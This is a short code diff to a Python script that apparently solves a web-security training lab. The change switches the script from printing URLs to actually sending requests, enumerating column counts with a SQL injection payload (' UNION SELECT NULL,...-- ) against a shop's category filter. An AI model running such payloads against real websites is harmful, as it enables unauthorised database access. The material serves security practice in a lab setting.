@@ -16,6 +16,7 @@ logging.basicConfig(
     style="{", 
     datefmt="%H:%M:%S",
 )
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
@@ -24,12 +25,11 @@ def main(args):
     nulls_list = ["NULL"]
     for i in range(2,51):
         nulls = ",".join(nulls_list)
-        filter_path = "filter?category=' UNION SELECT {nulls}-- "
+        filter_path = f"filter?category=' UNION SELECT {nulls}-- "
         exploit_url = shop.base_url + filter_path
-        print(exploit_url)
-        #resp = requests.get(shop.base_url + filter_path)
-       #if resp.status_code == 200:
-       #    break
+        resp = requests.get(shop.base_url + filter_path)
+        if resp.status_code == 200:
+            break
         nulls_list.append("NULL")        
     shop.is_solved()
     
